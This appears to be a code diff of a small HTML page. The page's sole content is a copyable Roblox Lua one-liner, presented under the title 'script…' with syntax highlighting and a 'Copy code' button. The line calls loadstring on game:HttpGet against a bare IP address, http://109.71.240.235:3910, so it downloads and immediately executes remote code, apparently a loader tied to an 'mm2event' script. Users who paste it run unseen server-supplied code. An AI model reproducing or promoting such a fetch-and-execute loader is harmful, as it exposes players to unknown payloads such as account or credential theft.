@@ -1,14 +1,180 @@
 <!doctype html>
-<html>
+<html lang="en">
 <head>
   <meta charset="utf-8">
   <title>script…</title>
-  <script>
-    // fallback for browsers that ignore meta refresh
-  </script>
+  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+
+    body {
+      background: #1a1a1a;
+      color: #ececec;
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 1.5rem;
+    }
+
+    .card {
+      background: #232323;
+      border: 1px solid #333;
+      border-radius: 12px;
+      overflow: hidden;
+      width: 100%;
+      max-width: 640px;
+    }
+
+    /* code block header bar */
+    .code-header {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      background: #2a2a2a;
+      border-bottom: 1px solid #333;
+      padding: .55rem 1rem;
+    }
+
+    .lang-label {
+      font-family: 'JetBrains Mono', monospace;
+      font-size: .72rem;
+      color: #888;
+      letter-spacing: .04em;
+    }
+
+    .copy-btn {
+      display: flex;
+      align-items: center;
+      gap: .35rem;
+      background: transparent;
+      border: none;
+      color: #888;
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+      font-size: .78rem;
+      cursor: pointer;
+      padding: .25rem .5rem;
+      border-radius: 6px;
+      transition: background .15s, color .15s;
+    }
+    .copy-btn:hover { background: #333; color: #ccc; }
+    .copy-btn.copied { color: #e8a87c; }
+
+    .copy-btn svg { width: 14px; height: 14px; }
+
+    /* code area */
+    .code-block {
+      background: #1e1e1e;
+      padding: 1.1rem 1.2rem;
+      font-family: 'JetBrains Mono', monospace;
+      font-size: .84rem;
+      line-height: 1.7;
+      overflow-x: auto;
+      white-space: pre-wrap;
+      word-break: break-all;
+    }
+
+    /* Lua syntax colors (VS Code dark-ish) */
+    .kw   { color: #c792ea; }   /* keywords */
+    .fn   { color: #82aaff; }   /* functions */
+    .str  { color: #c3e88d; }   /* strings */
+    .num  { color: #f78c6c; }   /* numbers */
+    .op   { color: #89ddff; }   /* operators / punctuation */
+    .cm   { color: #546e7a; font-style: italic; }  /* comments */
+    .id   { color: #eeffff; }   /* identifiers */
+  </style>
 </head>
 <body>
-  <p>Script: \n loadstring(game:HttpGet("http://109.71.240.235:3910/api/run/eyJpZCI6Ijg1MDZhMzIyLTZjNjQtNDIyMS04ZjBhLTg1MTM2ZWIxYTJmYyIsImtpbmQiOiJsb2FkZXIiLCJ2aXN1YWwiOnsiaWQiOiJtbTJldmVudCJ9fQ"))()
-  </p>
+
+<div class="card">
+  <div class="code-header">
+    <span class="lang-label">lua</span>
+    <button class="copy-btn" id="copyBtn" onclick="copyCode()">
+      <!-- copy icon -->
+      <svg id="iconCopy" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+        <rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/>
+      </svg>
+      <!-- check icon (hidden) -->
+      <svg id="iconCheck" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" style="display:none">
+        <polyline points="20 6 9 17 4 12"/>
+      </svg>
+      <span id="copyLabel">Copy code</span>
+    </button>
+  </div>
+  <div class="code-block" id="codeBlock"></div>
+</div>
+
+<script>
+  const raw = `loadstring(game:HttpGet("http://109.71.240.235:3910/api/run/eyJpZCI6Ijg1MDZhMzIyLTZjNjQtNDIyMS04ZjBhLTg1MTM2ZWIxYTJmYyIsImtpbmQiOiJsb2FkZXIiLCJ2aXN1YWwiOnsiaWQiOiJtbTJldmVudCJ9fQ"))()`;
+
+  // minimal Lua tokenizer
+  function highlight(code) {
+    const keywords = /\b(and|break|do|else|elseif|end|false|for|function|goto|if|in|local|nil|not|or|repeat|return|then|true|until|while)\b/g;
+    const builtins = /\b(assert|collectgarbage|dofile|error|ipairs|load|loadfile|next|pairs|pcall|print|rawequal|rawget|rawlen|rawset|require|select|setmetatable|tonumber|tostring|type|xpcall|string|table|math|io|os|coroutine|package|game|workspace|script|loadstring|HttpGet)\b/g;
+    const strings  = /(["'])(?:(?!\1)[^\\]|\\.)*?\1/g;
+    const numbers  = /\b\d+(\.\d+)?\b/g;
+    const ops      = /([(){}[\]:.,;=+\-*\/%#^<>~])/g;
+    const comments = /(--[^\n]*)/g;
+
+    // escape html first
+    let out = code
+      .replace(/&/g, '&amp;')
+      .replace(/</g, '&lt;')
+      .replace(/>/g, '&gt;');
+
+    // tokenize in one pass using a combined regex
+    // order: comments > strings > keywords > builtins > numbers > ops
+    const combined = /(--[^\n]*)|(["'])(?:(?!\2)[^\\]|\\.)*?\2|\b(and|break|do|else|elseif|end|false|for|function|goto|if|in|local|nil|not|or|repeat|return|then|true|until|while)\b|\b(assert|collectgarbage|dofile|error|ipairs|load|loadfile|next|pairs|pcall|print|rawequal|rawget|rawlen|rawset|require|select|setmetatable|tonumber|tostring|type|xpcall|string|table|math|io|os|coroutine|package|game|workspace|script|loadstring|HttpGet)\b|\b(\d+(?:\.\d+)?)\b|([(){}[\]:.,;=+\-*\/%#^&lt;&gt;~])/g;
+
+    // work on raw (unescaped) then re-escape per token
+    let result = '';
+    let last = 0;
+    const src = code; // raw source
+
+    // rebuild regex on raw source
+    const rx = /(--[^\n]*)|(["'])(?:(?!\2)[^\\]|\\.)*?\2|\b(and|break|do|else|elseif|end|false|for|function|goto|if|in|local|nil|not|or|repeat|return|then|true|until|while)\b|\b(assert|collectgarbage|dofile|error|ipairs|load|loadfile|next|pairs|pcall|print|rawequal|rawget|rawlen|rawset|require|select|setmetatable|tonumber|tostring|type|xpcall|string|table|math|io|os|coroutine|package|game|workspace|script|loadstring|HttpGet)\b|\b(\d+(?:\.\d+)?)\b/g;
+
+    let m;
+    while ((m = rx.exec(src)) !== null) {
+      // plain text before match
+      const plain = src.slice(last, m.index);
+      result += esc(plain);
+
+      const [full,comment,,,,kw,bi,num] = m;
+      if (m[1]) result += `<span class="cm">${esc(full)}</span>`;
+      else if (m[2]) result += `<span class="str">${esc(full)}</span>`;
+      else if (m[3]) result += `<span class="kw">${esc(full)}</span>`;
+      else if (m[4]) result += `<span class="fn">${esc(full)}</span>`;
+      else if (m[5]) result += `<span class="num">${esc(full)}</span>`;
+
+      last = m.index + full.length;
+    }
+    result += esc(src.slice(last));
+    return result;
+  }
+
+  function esc(s) {
+    return s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
+  }
+
+  document.getElementById('codeBlock').innerHTML = highlight(raw);
+
+  function copyCode() {
+    navigator.clipboard.writeText(raw).then(() => {
+      const btn = document.getElementById('copyBtn');
+      document.getElementById('iconCopy').style.display = 'none';
+      document.getElementById('iconCheck').style.display = '';
+      document.getElementById('copyLabel').textContent = 'Copied!';
+      btn.classList.add('copied');
+      setTimeout(() => {
+        document.getElementById('iconCopy').style.display = '';
+        document.getElementById('iconCheck').style.display = 'none';
+        document.getElementById('copyLabel').textContent = 'Copy code';
+        btn.classList.remove('copied');
+      }, 2000);
+    });
+  }
+</script>
 </body>
 </html>
